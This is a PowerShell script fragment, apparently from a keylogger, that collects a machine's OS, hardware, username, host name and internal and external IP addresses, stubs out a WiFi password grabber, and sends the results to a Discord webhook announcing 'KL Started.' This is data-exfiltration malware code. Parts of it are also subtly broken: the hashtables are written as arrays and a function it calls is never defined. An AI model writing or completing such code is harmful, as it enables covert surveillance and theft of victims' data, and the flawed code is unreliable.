# Existing script...

# Capture system information
function Get-SystemInfo {
    $sysinfo = @(
        "PC OS" = [System.Environment]::OSVersion.VersionString
        "OS Architecture" = [System.Environment]::Is64BitOperatingSystem ? "64-bit" : "32-bit"
        "PC CPU" = (Get-WmiObject -Class Win32_Processor).Name
        "PC RAM" = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2) + " GB"
    )
    $sysinfo
}

# Capture user information
function Get-UserInfo {
    $userinfo = @(
        "Username" = [System.Environment]::UserName
        "PC Name" = [System.Environment]::MachineName
        "Ext IP" = Get-PublicIP
        "Int IP" = (Get-WmiObject -Query 'Select IPAddress from Win32_NetworkAdapterConfiguration where IPEnabled=True').IPAddress
        # Add other fields as needed
    )
    $userinfo
}

# Capture WiFi Passwords (For illustration purposes; actual implementation varies)
function Get-WifiPass {
    # This function should retrieve and format WiFi passwords if applicable
    $wifipass = "SomeWiFi: SomePassword"
    return $wifipass
}

# Generate and send the report
function Send-DiscordWebhook {
    $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
    $systemInfo = Get-SystemInfo
    $userInfo = Get-UserInfo
    $wifiPass = Get-WifiPass

    $content = @"
    **KL Started.**

    **PC Information**
    `PC OS:` $($systemInfo['PC OS'])
    `OS Architecture:` $($systemInfo['OS Architecture'])
    `PC CPU:` $($systemInfo['PC CPU'])
    `PC RAM:` $($systemInfo['PC RAM'])

    **User Information**
    `Username:` $($userInfo['Username'])
    `PC Name:` $($userInfo['PC Name'])
    `Ext IP:` $($userInfo['Ext IP'])
    `Int IP:` $($userInfo['Int IP'])

    **WiFi Pass:**
    $wifiPass
    "@

    $jsonsys = @{
        "username" = "$env:COMPUTERNAME"
        "content" = $content
    } | ConvertTo-Json

    Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
}

# Call the function to send the data
Send-DiscordWebhook
